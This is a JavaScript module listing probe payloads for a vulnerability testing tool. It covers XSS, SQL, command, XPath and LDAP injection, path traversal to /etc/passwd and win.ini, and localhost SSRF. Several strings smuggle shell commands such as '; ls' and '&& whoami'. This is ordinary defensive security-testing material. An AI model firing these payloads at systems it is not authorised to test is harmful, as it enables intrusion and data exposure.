// Centralized library of benign test payloads for common vulnerability classes
// Note: These are for sanctioned testing only; do not use on unauthorized systems.

export const PAYLOADS = {
  xss: {
    key: 'xss',
    label: 'XSS',
    payloads: [
      '<script>alert(1)</script>',
      "\" onmouseover=alert(1) x=\"",
      "' onfocus=alert(1) x='",
      "'><img src=x onerror=alert(1)>",
    ],
  },
  sqli: {
    key: 'sqli',
    label: 'SQL Injection',
    payloads: [
      "' OR '1'='1",
      "' UNION SELECT NULL-- ",
      '" OR "1"="1" -- ',
      "') OR ('1'='1",
    ],
  },
  cmdi: {
    key: 'cmdi',
    label: 'Command Injection',
    payloads: ['; ls', '&& whoami', '| id', '|| echo test'],
  },
  pathTraversal: {
    key: 'pathTraversal',
    label: 'Path Traversal',
    payloads: ['../../../../etc/passwd', '..\\..\\..\\..\\Windows\\win.ini'],
  },
  ssrf: {
    key: 'ssrf',
    label: 'SSRF (benign)',
    payloads: ['http://127.0.0.1:80', 'http://localhost:8080'],
  },
  xpath: {
    key: 'xpath',
    label: 'XPath Injection',
    payloads: ["' or '1'='1", '" or "1"="1'],
  },
  ldap: {
    key: 'ldap',
    label: 'LDAP Injection',
    payloads: ['*)(uid=*)', '*)(|(uid=*))'],
  },
};

export const DEFAULT_VULNS = [
  PAYLOADS.xss,
  PAYLOADS.sqli,
  PAYLOADS.cmdi,
  PAYLOADS.pathTraversal,
  PAYLOADS.ssrf,
  PAYLOADS.xpath,
  PAYLOADS.ldap,
];
